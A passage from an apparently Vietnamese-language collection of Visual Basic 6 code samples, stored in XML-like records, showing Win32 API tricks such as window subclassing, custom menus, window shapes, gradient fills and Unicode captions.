        Dim MinMax As MINMAXINFO
        
        CopyMemory MinMax, ByVal lp, Len(MinMax)
        MinMax.ptMinTrackSize.x = 3975 \ Screen.TwipsPerPixelX
        MinMax.ptMinTrackSize.y = 1740 \ Screen.TwipsPerPixelY
        MinMax.ptMaxTrackSize.x = Screen.Width \ Screen.TwipsPerPixelX \ 2
        MinMax.ptMaxTrackSize.y = 3480 \ Screen.TwipsPerPixelY
        
        CopyMemory ByVal lp, MinMax, Len(MinMax)
        SubClass1_WndMessage = 1
        
        Exit Function
    End If
    ' Here, we forward all irrelevant messages on to the default message handler.
    SubClass1_WndMessage = CallWindowProc(OldWindowProc, hwnd, Msg, wp, lp)
        
End Function

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607230722231248</MaVD>
    <NoiDung>'add vào form
Option Explicit

Private Sub Form_Load()
Call Hook(Text1.hWnd)
End Sub

Private Sub Form_Unload(Cancel As Integer)
Call UnHook
End Sub

'--  add vào module  ------------
Option Explicit

Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Public Const GWL_WNDPROC = -4
Public Const WM_RBUTTONUP = &amp;H205
Public lpPrevWndProc As Long
Private lngHWnd As Long

Public Sub Hook(hWnd As Long)
    lngHWnd = hWnd
    lpPrevWndProc = SetWindowLong(lngHWnd, GWL_WNDPROC, AddressOf WindowProc)
End Sub

Public Sub UnHook()
    Dim lngReturnValue As Long
    lngReturnValue = SetWindowLong(lngHWnd, GWL_WNDPROC, lpPrevWndProc)
End Sub

Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

    Select Case uMsg
        Case WM_RBUTTONUP
        Case Else: WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
    End Select
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607240826081232</MaVD>
    <NoiDung>'add vào module
Option Explicit

Public Const GWL_WNDPROC = (-4)
Public Const WM_ENDSESSION = &amp;H16
Public Const WM_QUERYENDSESSION = &amp;H11
Public WndProc As Long

Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Public Sub Hook(Lwnd As Long)
        WndProc = SetWindowLong(Lwnd, GWL_WNDPROC, AddressOf WindowProc)
End Sub

Public Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    If uMsg = WM_QUERYENDSESSION Then
        WindowProc = False 'send don't shut down
        Exit Function
    ElseIf uMsg = WM_ENDSESSION Then
        WindowProc = False
        Exit Function
    End If
    WindowProc = CallWindowProc(WndProc, hw, uMsg, wParam, lParam)
End Function

'----add vào form
Option Explicit

Private Sub Form_Load()
    Hook Me.hwnd
End Sub

Private Sub Form_Unload(Cancel As Integer)
    SetWindowLong Me.hwnd, GWL_WNDPROC, WndProc
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607240836231595</MaVD>
    <NoiDung>'add vào module
Option Explicit
    
DefLng A-Z
Declare Function FindWindowEx Lib "user32" _
        Alias "FindWindowExA" (ByVal hWnd As Long, _
        ByVal hWndChild As Long, ByVal lpszClassName As String, _
        ByVal lpszWindow As String) As Long
Declare Function ShowWindow Lib "user32" _
        (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long

Public Const SW_HIDE = 0
Public Const SW_SHOW = 5
Public Const g_cstrShellViewWnd As String = "Progman"

'---add vào form
Option Explicit

    DefLng A-Z

Private Function FindShellWindow() As Long
        'Hàm dùng ?? l?y Handle c?a Desktop
Dim hWnd As Long
On Error Resume Next
    hWnd = FindWindowEx(0&amp;, 0&amp;, g_cstrShellViewWnd, vbNullString)
    If hWnd &lt;&gt; 0 Then
        FindShellWindow = hWnd
    End If
End Function

Private Sub HideShowWindow(ByVal hWnd As Long, Optional ByVal Hide As Boolean = False)
Dim lngShowCmd As Long
On Error Resume Next
    If Hide = True Then
        lngShowCmd = SW_HIDE
    Else
        lngShowCmd = SW_SHOW
    End If
    Call ShowWindow(hWnd, lngShowCmd)
End Sub

' In form
Private Sub command2_Click()
Dim hWnd As Long
On Error Resume Next
    hWnd = FindShellWindow()
    If hWnd &lt;&gt; 0 Then
        Call HideShowWindow(hWnd)
    End If
End Sub

Private Sub command1_Click()
Dim hWnd As Long
On Error Resume Next
    hWnd = FindShellWindow()
    If hWnd &lt;&gt; 0 Then
        Call HideShowWindow(hWnd, True)
    End If
End Sub

Private Sub Form_Load()
    Command1.Caption = "Hide Desktop"
    Command2.Caption = "Show Desktop"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607241112010379</MaVD>
    <NoiDung>Private Sub Form_Load()
    Me.Font = "Arial"
    'Chiều rộng chuỗi "ABC" của font Arial
    MsgBox Me.TextWidth("ABC")
    'Chiều cao chuỗi "ABC" của font Arial
    MsgBox Me.TextHeight("ABC")
    Me.Font = "Tahoma"
    'Chiều rộng chuỗi "ABC" của font Tahoma
    MsgBox TextWidth("ABC")
    'Chiều cao chuỗi "ABC" của font Tahoma
    MsgBox TextHeight("ABC")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301145520311</MaVD>
    <NoiDung>Private Sub Form_Load()
    'Form1.WindowState = 2
    Form1.Caption = Space(100) &amp; "Visual Basic"
End Sub

Private Sub Timer1_Timer()
    Form1.Caption = Right(Form1.Caption, Len(Form1.Caption) - 1)
    If Form1.Caption = " Then
        Form1.Caption = Space(100) &amp; "Visual Basic"
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301147430189</MaVD>
    <NoiDung>'Module code
Declare Function FlashWindow Lib "user32" (ByVal hwnd As Long, ByVal bInvert As Long) As Long

'Form code
Private Sub Timer1_Timer()
    FlashWindow Me.hwnd, True
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301150560985</MaVD>
    <NoiDung>'Module code
Public Const LP_HT_CAPTION = 2
Public Const WM_NCLBUTTONDOWN = &amp;HA1

Public Declare Function ReleaseCapture Lib "user32" () As Long

Public Declare Function SendMessage Lib "user32" _
        Alias "SendMessageA" (ByVal hwnd As Long, _
        ByVal wMsg As Long, ByVal wParam As Long, _
        lParam As Any) As Long

'Đặt thuộc tính ControlBox của Form là False và Caption của Form là trống. Kế tiếp, thêm một PictureBox, một CommandButton và đoạn code sau đây vào Form

'Form code 
Private Sub Form_Load()
    Call Form_Resize
End Sub

Private Sub Form_Resize()
    Picture1.Width = Me.Width
    Command1.Left = Me.Width - Command1.Width - 140
End Sub

Private Sub Picture1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim retVal As Long
    retVal = ReleaseCapture
    retVal = SendMessage(Form1.hwnd, WM_NCLBUTTONDOWN, LP_HT_CAPTION, ByVal 0&amp;)
End Sub

Private Sub Command1_Click()
    Unload Me
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301151472586</MaVD>
    <NoiDung>'Form code
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long

Private Const GWL_STYLE = (-16)
Private Const WS_CAPTION = &amp;HC00000
Private Const WS_MAXIMIZEBOX = &amp;H10000
Private Const WS_MINIMIZEBOX = &amp;H20000
Private Const WS_SYSMENU = &amp;H80000
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Private Enum ESetWindowPosStyles
    SWP_SHOWWINDOW = &amp;H40
    SWP_HIDEWINDOW = &amp;H80
    SWP_FRAMECHANGED = &amp;H20
    SWP_NOACTIVATE = &amp;H10
    SWP_NOCOPYBITS = &amp;H100
    SWP_NOMOVE = &amp;H2
    SWP_NOOWNERZORDER = &amp;H200
    SWP_NOREDRAW = &amp;H8
    SWP_NOREPOSITION = SWP_NOOWNERZORDER
    SWP_NOSIZE = &amp;H1
    SWP_NOZORDER = &amp;H4
    SWP_DRAWFRAME = SWP_FRAMECHANGED
    HWND_NOTOPMOST = -2
End Enum

Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

Private Function ShowTitleBar(ByVal bState As Boolean)
    Dim lStyle As Long
    Dim tR As RECT
    GetWindowRect Me.hwnd, tR
    lStyle = GetWindowLong(Me.hwnd, GWL_STYLE)
    If (bState) Then
    Me.Caption = Me.Tag
    If Me.ControlBox Then
    lStyle = lStyle Or WS_SYSMENU
    End If
    If Me.MaxButton Then
    lStyle = lStyle Or WS_MAXIMIZEBOX
    End If
    If Me.MinButton Then
    lStyle = lStyle Or WS_MINIMIZEBOX
    End If
    If Me.Caption &lt;&gt; " Then
    lStyle = lStyle Or WS_CAPTION
    End If
    Else
    Me.Tag = Me.Caption
    Me.Caption = "
    lStyle = lStyle And Not WS_SYSMENU
    lStyle = lStyle And Not WS_MAXIMIZEBOX
    lStyle = lStyle And Not WS_MINIMIZEBOX
    lStyle = lStyle And Not WS_CAPTION
    End If
    SetWindowLong Me.hwnd, GWL_STYLE, lStyle
    SetWindowPos Me.hwnd, 0, tR.Left, tR.Top, tR.Right - tR.Left, tR.Bottom - tR.Top, SWP_NOREPOSITION Or SWP_NOZORDER Or SWP_FRAMECHANGED
    Me.Refresh
    'Form_Resize
End Function

'Để thử nghiệm đoạn code trên, bạn hãy thêm một CheckBox (với thuộc tính Value là 1) và đoạn code sai đây vào Form

'Form code
Private Sub Check1_Click()
    If (Check1.Value = Checked) Then
        ShowTitleBar True
    Else
       ShowTitleBar False
    End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301157171380</MaVD>
    <NoiDung>'Module code
Option Explicit

Public Declare Function SetWindowRgn Lib "user32" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Public Declare Function CreatePolygonRgn Lib "gdi32" (lpPoint As POINTAPI, ByVal nCount As Long, ByVal nPolyFillMode As Long) As Long

Public Type POINTAPI
    X As Long
    Y As Long
End Type

Public Function CreatePointStruct(lX As Long, lY As Long) As POINTAPI
    With CreatePointStruct
        .X = lX
        .Y = lY
    End With
End Function

'Form code
Private Sub Form_Load()
    Dim ArrBorder(0 To 9) As POINTAPI
    ArrBorder(0) = CreatePointStruct(97, 0)
    ArrBorder(1) = CreatePointStruct(120, 65)
    ArrBorder(2) = CreatePointStruct(193, 65)
    ArrBorder(3) = CreatePointStruct(134, 106)
    ArrBorder(4) = CreatePointStruct(156, 171)
    ArrBorder(5) = CreatePointStruct(97, 131)
    ArrBorder(6) = CreatePointStruct(37, 171)
    ArrBorder(7) = CreatePointStruct(59, 106)
    ArrBorder(8) = CreatePointStruct(0, 65)
    ArrBorder(9) = CreatePointStruct(74, 65)
    SetWindowRgn hWnd, CreatePolygonRgn(ArrBorder(0), 10, 1), True
End Sub

'Nếu bạn muốn tạo cửa sổ có dạng đặc biệt, trước tiên bạn nên vẽ hình dạng đó trong một ứng dụng đồ họa như PaintShop Pro, Photoshop… Kế đó, bạn có thể dễ dàng tìm ra tọa độ các điểm nào cần sử dụng (hình ngôi sao ở trên có 10 điểm).
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301159411040</MaVD>
    <NoiDung>'frmSplash code
Dim i As Integer

Private Sub Form_Load()
'Tao Gradient Fill
    Dim fColor As Integer
    Dim T As Integer
    With frmSplash
        .AutoRedraw = True
        .DrawStyle = 6
        .DrawMode = 13
        .DrawWidth = 2
        .ScaleMode = 3
        .ScaleHeight = 256 * 2
        For fColor = 0 To 255
            Line (0, T)-(Width, T + 2), RGB(200, 100, fColor), BF
            T = T + 2
        Next fColor
    End With
End Sub

Private Sub tmrSplash_Timer()
    
    Dim sText(6) As String
    
    sText(1) = "Fonts..."
    sText(2) = "Pictures..."
    sText(3) = "Menus..."
    sText(4) = "Toolbars..."
    sText(5) = "Prefrences..."
    sText(6) = "Done"
    
    i = i + 1
    
    lblText(3) = sText(i)
    
    If i &gt; 5 Then
        frmSplash.Hide
        frmMain.Show
        tmrSplash.Enabled = False
    End If
    
    If imgFlash(1).Visible = True Then
        imgFlash(1).Visible = False
    Else
        imgFlash(1).Visible = True
    End If
    
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301234252586</MaVD>
    <NoiDung>'Module code
Public Declare Function SetWindowLong Lib "user32" _
        Alias "SetWindowLongA" (ByVal hwnd As Long, _
        ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Public Declare Function CallWindowProc Lib "user32" _
        Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, _
        ByVal hwnd As Long, ByVal Msg As Long, _
        ByVal wParam As Long, ByVal lParam As Long) As Long

Public Const GWL_WNDPROC = (-4)
Public Const GWL_USERDATA = (-21)

Public Declare Sub CopyMemory Lib "kernel32" Alias _
        "RtlMoveMemory" (Destination As Any, Source As Any, _
        ByVal Length As Long)

Public Type POINTAPI
    X As Long
    Y As Long
End Type

Public Type MINMAXINFO
    ptReserved As POINTAPI
    ptMaxSize As POINTAPI
    ptMaxPosition As POINTAPI
    ptMinTrackSize As POINTAPI
    ptMaxTrackSize As POINTAPI
End Type

Public Const WM_SIZE = &amp;H5
Public Const WM_GETMINMAXINFO = &amp;H24

Public Function SubWndProc(ByVal hwnd As Long, _
        ByVal uMsg As Long, ByVal wParam As Long, _
        ByVal lParam As Long) As Long
    SubWndProc = frmSubclass.WindowProc(hwnd, uMsg, wParam, lParam)
End Function

'Form code (frmSubclass)
Private mhWndSubClassed As Long
Private mWndProcNext As Long

Private Sub Form_Load()
    SubClass Me.hwnd
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    UnSubClass
End Sub

Private Sub SubClass(hwnd)
    
    Dim lResult As Long
    UnSubClass
            
    mWndProcNext = SetWindowLong(hwnd, GWL_WNDPROC, AddressOf SubWndProc)
            
    If mWndProcNext Then
        mhWndSubClassed = hwnd
        lResult = SetWindowLong(hwnd, GWL_USERDATA, ObjPtr(Me))
    End If

End Sub

Private Sub UnSubClass()
    If mWndProcNext Then
        SetWindowLong mhWndSubClassed, GWL_WNDPROC, mWndProcNext
        mWndProcNext = 0
    End If
End Sub

Friend Function WindowProc(ByVal hwnd As Long, _
        ByVal uMsg As Long, ByVal wParam As Long, _
        ByVal lParam As Long) As Long
    Select Case uMsg
        Case WM_SIZE
            Debug.Print "WM_SIZE"
        Case WM_GETMINMAXINFO
            Debug.Print "WM_GETMINMAXINFO"
            Dim mmiT As MINMAXINFO
            CopyMemory mmiT, ByVal lParam, Len(mmiT)
            mmiT.ptMinTrackSize.X = 250
            mmiT.ptMinTrackSize.Y = 150
            CopyMemory ByVal lParam, mmiT, Len(mmiT)
            Exit Function
    End Select
    WindowProc = CallWindowProc(mWndProcNext, hwnd, uMsg, wParam, ByVal lParam)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301415141049</MaVD>
    <NoiDung>Private Declare Function DefWindowProcW Lib "user32" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Const WM_SETTEXT As Long = &amp;HC

Private Sub Form_Load()
    SetUniText Me.hwnd, "Ti" &amp; ChrW(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW(&amp;H1EC7) &amp; "t Unicode"
'    SetUniText Frame1.hwnd, "Ti" &amp; ChrW(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW(&amp;H1EC7) &amp; "t Unicode"
'    SetUniText Option1.hwnd, "Ti" &amp; ChrW(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW(&amp;H1EC7) &amp; "t Unicode"
'    SetUniText Check1.hwnd, "Ti" &amp; ChrW(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW(&amp;H1EC7) &amp; "t Unicode"
'    SetUniText Command1.hwnd, "Ti" &amp; ChrW(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW(&amp;H1EC7) &amp; "t Unicode"
End Sub

Public Sub SetUniText(ByVal hwnd As Long, ByVal sUniText As String)
'
' Mo ta:        Unicode TitleBar, Frame, Button, CheckBox, Option
' Yeu cau:      Frame, Button, CheckBox, Option khong ho tro XP style
' Nguoi viet:   thuongall
' Email:        thuongall@yahoo.com
' Website:      www.caulacbovb.com
'
    DefWindowProcW hwnd, WM_SETTEXT, &amp;H0&amp;, StrPtr(sUniText)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607301500062089</MaVD>
    <NoiDung>Private Declare Function CreatePopupMenu Lib "user32" () As Long
Private Declare Function TrackPopupMenu Lib "user32" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal X As Long, ByVal Y As Long, ByVal nReserved As Long, ByVal hWnd As Long, ByVal lprc As Any) As Long
Private Declare Function AppendMenu Lib "user32" Alias "AppendMenuW" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As Long) As Long
Private Declare Function DestroyMenu Lib "user32" (ByVal hMenu As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long

Private Const TPM_RETURNCMD = &amp;H100&amp;
Private Const MF_SEPARATOR = &amp;H800&amp;
Private Const MF_STRING = &amp;H0&amp;

Private Type POINTAPI
    X As Long
    Y As Long
End Type

Dim hMenu As Long

Private Sub Form_Load()
    'Create an empty popupmenu
    hMenu = CreatePopupMenu()
    'Append a few menu items
    AppendMenu hMenu, MF_STRING, 1101, StrPtr("C" &amp; ChrW(&amp;H1EAF) &amp; "t")
    AppendMenu hMenu, MF_STRING, 1102, StrPtr("Sao chép")
    AppendMenu hMenu, MF_STRING, 1103, StrPtr("Dán")
    AppendMenu hMenu, MF_SEPARATOR, 1200, ByVal 0&amp;
    AppendMenu hMenu, MF_STRING, 1300, StrPtr("Ch" &amp; ChrW(&amp;H1ECD) &amp; "n h" &amp; ChrW(&amp;H1EBF) &amp; "t")
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 2 Then
        Dim MP As POINTAPI
        Dim sMenu As Long
        'Get the position of the mouse cursor
        GetCursorPos MP
        sMenu = TrackPopupMenu(hMenu, TPM_RETURNCMD, MP.X, MP.Y, 0, Me.hWnd, 0&amp;)
        'check for clicks
        Select Case sMenu
            Case 1101
                MsgBox "Cut"
            Case 1102
                MsgBox "Copy"
            Case 1103
                MsgBox "Paste"
            Case 1300
                MsgBox "Select All"
            Case Else
                'Microsoft say's you should always have a Case Else so here it is.
        End Select
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
    DestroyMenu hMenu
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607312251232533</MaVD>
    <NoiDung>'add vào Form
Option Explicit

Private Sub Form_Resize()
    Dim Temp As Long
    Temp = Me.AutoRedraw
    Me.AutoRedraw = True
    
    Fill_Gradient hDC, Me.BackColor, vbWhite, Me.ScaleWidth, Me.ScaleHeight, GRADIENT_FILL_RECT_V
    Me.Picture = Me.Image
    
    Me.AutoRedraw = Temp
End Sub

'-----add vào Module
Option Explicit

Private Type Colour16
   Red As Long
   Green As Long
   Blue As Long
End Type

Private Type TRIVERTEX
    x As Long
    y As Long
    Red As Integer
    Green As Integer
    Blue As Integer
    Alpha As Integer
End Type

Private Type GRADIENT_RECT
    UpperLeft As Long
    LowerRight As Long
End Type

Public Enum GRADIENT_TYPE
    GRADIENT_FILL_RECT_H = &amp;H0
    GRADIENT_FILL_RECT_V = &amp;H1
End Enum

Private Declare Function GradientFillRect Lib "msimg32" Alias "GradientFill" (ByVal hDC As Long, pVertex As TRIVERTEX, ByVal dwNumVertex As Long, pMesh As GRADIENT_RECT, ByVal dwNumMesh As Long, ByVal dwMode As Long) As Long
Private Declare Function TranslateColor Lib "olepro32.dll" Alias "OleTranslateColor" (ByVal clr As OLE_COLOR, ByVal palet As Long, col As Long) As Long

Public Sub Fill_Gradient(hDC As Long, Color1 As OLE_COLOR, Color2 As OLE_COLOR, nWidth As Long, nHeight As Long, TypeG As GRADIENT_TYPE)
    Dim vert(1) As TRIVERTEX, gRect As GRADIENT_RECT
    Dim Temp As Colour16
    
    Temp = LongToRGB(Color1)
    With vert(0)
        .Red = Temp.Red
        .Green = Temp.Green
        .Blue = Temp.Blue
    End With
    
    Temp = LongToRGB(Color2)
    With vert(1)
        .x = nWidth
        .y = nHeight
        .Red = Temp.Red
        .Green = Temp.Green
        .Blue = Temp.Blue
    End With
    
    gRect.LowerRight = 1

    GradientFillRect hDC, vert(0), 2, gRect, 1, TypeG
End Sub

Private Function LongToRGB(ByVal lColour As Long) As Colour16
   Dim iTemp As Byte
   'Don't forget to convert those system colours...
   TranslateColor lColour, 0, lColour
   'Red
   iTemp = CByte(lColour And vbRed)
   LongToRGB.Red = ByteToUShort(iTemp)
   'Green
   iTemp = CByte((lColour And vbGreen) / 256)
   LongToRGB.Green = ByteToUShort(iTemp)
   'Blue
   iTemp = CByte((lColour And vbBlue) / 65536)
   LongToRGB.Blue = ByteToUShort(iTemp)
End Function

Private Function ByteToUShort(ByVal bt As Byte) As Integer
   If bt &lt; 128 Then
      ByteToUShort = CInt(CLng("&amp;H" &amp; Hex(bt) &amp; "00"))
   Else
      ByteToUShort = CInt(CLng("&amp;H" &amp; Hex(bt) &amp; "00") - &amp;H10000)
   End If
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0608061222501895</MaVD>
    <NoiDung>'add vào module
Option Explicit

Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function GetSystemMenu Lib "user32" (ByVal hWnd As Long, ByVal bRevert As Long) As Long
Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Public Const WM_SYSCOMMAND = &amp;H112
Public Const MF_SEPARATOR = &amp;H800&amp;
Public Const MF_STRING = &amp;H0&amp;
Public Const GWL_WNDPROC = (-4)
Public Const IDM_ABOUT As Long = 1010
Public lProcOld As Long

Public Function SysMenuHandler(ByVal hWnd As Long, ByVal iMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

If iMsg = WM_SYSCOMMAND Then
    If wParam = IDM_ABOUT Then
        MsgBox "www.caulacbovb.com", vbInformation, "About"
        Exit Function
    End If
End If
SysMenuHandler = CallWindowProc(lProcOld, hWnd, iMsg, wParam, lParam)

End Function
Public Function SubClass(FormName As Form)

Dim lhSysMenu As Long, lRet As Long

    lhSysMenu = GetSystemMenu(FormName.hWnd, 0&amp;)
    lRet = AppendMenu(lhSysMenu, MF_SEPARATOR, 0&amp;, _
    vbNullString)
    lRet = AppendMenu(lhSysMenu, MF_STRING, _
    IDM_ABOUT, "About...")
    FormName.Show
    lProcOld = SetWindowLong(FormName.hWnd, GWL_WNDPROC, AddressOf SysMenuHandler)

End Function

'----add vào Form
Option Explicit

Private Sub Form_Load()
    Dim d As String
    d = SubClass(Form1) ' Type the name of the form d =SubClass(&lt;FormName&gt;)
End Sub

Private Sub Form_Unload(Cancel As Integer)
    SetWindowLong Me.hWnd, GWL_WNDPROC, lProcOld
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0608062209077240</MaVD>
    <NoiDung>'add vào Module1
Option Explicit
'Call MenuRemoveClose(Me)
Private Declare Function GetMenuItemInfo Lib "user32" Alias "GetMenuItemInfoA" (ByVal hMenu As Long, ByVal un As Long, ByVal B As Long, lpMenuItemInfo As MENUITEMINFO) As Long
Private Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Private Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Long, ByVal bRevert As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Private Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Private Declare Function SetMenuItemInfo Lib "user32" Alias "SetMenuItemInfoA" (ByVal hMenu As Long, ByVal un As Long, ByVal bypos As Long, lpcMenuItemInfo As MENUITEMINFO) As Long

Private Const SWP_DRAWFRAME = &amp;H20
Private Const SWP_NOMOVE = &amp;H2
Private Const SWP_NOSIZE = &amp;H1
Private Const SWP_NOZORDER = &amp;H4
Private Const SWP_FLAGS = SWP_NOZORDER Or SWP_NOSIZE Or SWP_NOMOVE Or SWP_DRAWFRAME
Private Const MF_BYCOMMAND = &amp;H0
Private Const MF_BYPOSITION = &amp;H400
Private Const MF_REMOVE = &amp;H1000
Private Const MIIM_STATE = &amp;H1
Private Const MIIM_ID = &amp;H2
Private Const MIIM_SUBMENU = &amp;H4
Private Const MIIM_CHECKMARKS = &amp;H8
Private Const MIIM_TYPE = &amp;H10
Private Const MIIM_DATA = &amp;H20
Private Const MFT_STRING = &amp;H0&amp;
Private Const MFT_RADIOCHECK = &amp;H200&amp;
Private Const MFS_DISABLED = &amp;H3
Private Type MENUITEMINFO
    cbsize As Long
    fmask As Long
    ftype As Long
    fstate As Long
    wID As Long
    hSubMenu As Long
    hBmpCheck As Long
    hbmbUncheck As Long
    dwItemdata As Long
    dwTypedata As String
    cch As Long
End Type

Public Sub DelMenuClose(frm As Form)
' bÊt kú la kiÓu g×
Dim c As Long
Dim hMenu As Long
Dim mInfo As MENUITEMINFO
Dim pos As Long

hMenu = GetSystemMenu(frm.hwnd, 0)

For c = GetMenuItemCount(hMenu) To 0 Step -1
    With mInfo
        .cbsize = Len(mInfo)
        .fmask = MIIM_TYPE Or MIIM_ID
        .ftype = MFT_STRING
        .dwTypedata = Space(256)
        .cch = Len(mInfo.dwTypedata)
    End With
    
    If GetMenuItemInfo(hMenu, c, True, mInfo) = 1 Then
        If (mInfo.wID = 61536) Then ' close
            Call RemoveMenu(hMenu, c, MF_REMOVE Or MF_BYPOSITION)
            Call RemoveMenu(hMenu, c - 1, MF_REMOVE Or MF_BYPOSITION)
        End If
    End If
Next c

Call SetWindowPos(frm.hwnd, 0, 0, 0, 0, 0, SWP_FLAGS)
Call DrawMenuBar(frm.hwnd)

End Sub


Public Sub Chemenu(frm As Form, menuIndext As Integer)
     Dim R As Long
     Dim hSubbmenu As Long
     Dim mnuItemCount As Long
     Dim mInfo As MENUITEMINFO
     hSubbmenu = GetSubMenu(GetMenu(frm.hwnd), menuIndext)
     mnuItemCount = GetMenuItemCount(hSubbmenu)
     Dim chiadoi As Long
     chiadoi = CLng(mnuItemCount / 2 - 0.5) ' khi  item le
     If chiadoi &lt; 1 Then chiadoi = 1 ' khi co 2 item
     mInfo.cbsize = Len(mInfo)
     mInfo.fmask = MIIM_TYPE
     mInfo.ftype = MFT_STRING
     mInfo.dwTypedata = Space(256)
     mInfo.cch = Len(mInfo.dwTypedata)
     R = GetMenuItemInfo(hSubbmenu, (mnuItemCount - chiadoi), True, mInfo)
     mInfo.ftype = SWP_DRAWFRAME
     R = SetMenuItemInfo(hSubbmenu, (mnuItemCount - chiadoi), True, mInfo)
End Sub

'----add vào Module2
Option Explicit
'  Xu ly menu hethong
Private Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Private Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Long, ByVal bRevert As Long) As Long
Private Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As Any) As Long
Private Const MF_STRING = &amp;H0&amp;
Private Const MF_SEPARATOR = &amp;H800&amp;
Private Const MF_BYCOMMAND = &amp;H0&amp;
Private Const MF_BYPOSITION = &amp;H400&amp;
Private Const WM_SYSCOMMAND = &amp;H112
Private Const WM_MENUBASE = &amp;H2000
Private Const SC_CLOSE = &amp;HF060&amp;
Private Const SC_MAXIMIZE = &amp;HF030&amp;
Private Const SC_MINIMIZE = &amp;HF020&amp;
Private Const SC_MOVE = &amp;HF010&amp;
Private Const SC_NEXTWINDOW = &amp;HF040&amp;
Private Const SC_PREVWINDOW = &amp;HF050&amp;
Private Const SC_RESTORE = &amp;HF120&amp;
Private Const SC_SIZE = &amp;HF000&amp;
Private giCurrentId As Long
'===========

